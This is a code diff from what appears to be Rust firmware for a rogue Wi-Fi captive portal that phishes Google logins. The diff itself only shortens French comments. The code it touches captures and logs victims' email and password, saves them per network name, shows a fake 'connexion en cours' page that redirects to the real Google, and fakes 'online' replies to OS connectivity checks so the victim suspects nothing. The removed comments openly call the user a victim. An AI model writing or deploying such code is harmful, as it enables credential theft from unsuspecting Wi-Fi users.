@@ -149,14 +149,12 @@ struct Credential {
 
 static CAPTURED_CREDS: Mutex<Vec<Credential>> = Mutex::new(Vec::new());
 
-/// Passe à `true` dès qu'un client a soumis ses identifiants. Les endpoints de
-/// détection de portail captif répondent alors « online » pour que l'OS ferme
-/// la fenêtre du portail et laisse la victime reprendre sa navigation.
+/// `true` après soumission des identifiants : les endpoints de détection de
+/// portail captif répondent « online » pour que l'OS ferme la fenêtre.
 static PORTAL_DONE: AtomicBool = AtomicBool::new(false);
 
-/// Page renvoyée APRÈS soumission (au lieu d'un JSON) : une vraie page HTML
-/// « connexion en cours » qui redirige vers le vrai Google. La victime ne voit
-/// que du feu et croit s'être connectée normalement.
+/// Page renvoyée après soumission : HTML « connexion en cours » qui redirige
+/// vers le vrai Google.
 const SUCCESS_PAGE: &str = r##"<!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -350,8 +348,7 @@ where
                 info!("Creds captures: {} / {}", email, pass);
                 save_cred_to_storage(&ssid_owned, &email, &pass);
                 PORTAL_DONE.store(true, Ordering::Relaxed);
-                // Comportement « normal » : on renvoie une vraie page HTML de
-                // redirection (pas de JSON visible), et on libère le portail.
+                // Page HTML de redirection (pas de JSON) et libération du portail.
                 let data = SUCCESS_PAGE.as_bytes();
                 let mut resp = req.into_response(
                     200,
@@ -383,9 +380,8 @@ where
     ] {
         server.fn_handler(p, Method::Get, |req| {
             if PORTAL_DONE.load(Ordering::Relaxed) {
-                // Identifiants déjà capturés : on simule un vrai accès Internet
-                // avec la réponse attendue par chaque OS, pour que la fenêtre de
-                // portail captif se ferme et laisse l'utilisateur naviguer.
+                // Creds capturés : renvoie la réponse « online » attendue par l'OS
+                // pour fermer la fenêtre de portail captif.
                 let uri = req.uri().to_string();
                 if uri.contains("204") {
                     req.into_response(204, Some("No Content"), &[])?;
